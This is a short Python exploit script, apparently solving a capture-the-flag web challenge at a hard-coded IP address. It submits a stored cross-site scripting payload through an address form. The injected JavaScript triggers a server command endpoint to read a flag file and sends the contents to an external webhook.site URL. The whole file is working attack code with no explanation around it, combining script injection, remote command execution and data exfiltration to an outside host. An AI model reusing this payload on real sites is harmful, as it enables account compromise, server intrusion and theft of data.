#!/usr/bin/env python3

import requests

HOST, PORT = "94.237.59.206", 46529
CHALLENGE_URL = f"http://{HOST}:{PORT}"
WEBHOOK_URL = "https://webhook.site/77fc6923-2fef-4f8f-a4fd-c90a109332c8"

def main():
    form_data = {
        "address": f"<script>(async () => {{let response = await fetch('/api/stats?command=cat+/flag6f3193c5ba.txt');let flag = await response.text();await fetch('{WEBHOOK_URL}?c=' + flag)}})()</script>"
    }

    r = requests.post(f"{CHALLENGE_URL}/add/address", data=form_data)
    print(r.text)
    print(form_data)


if __name__ == "__main__":
    main() 
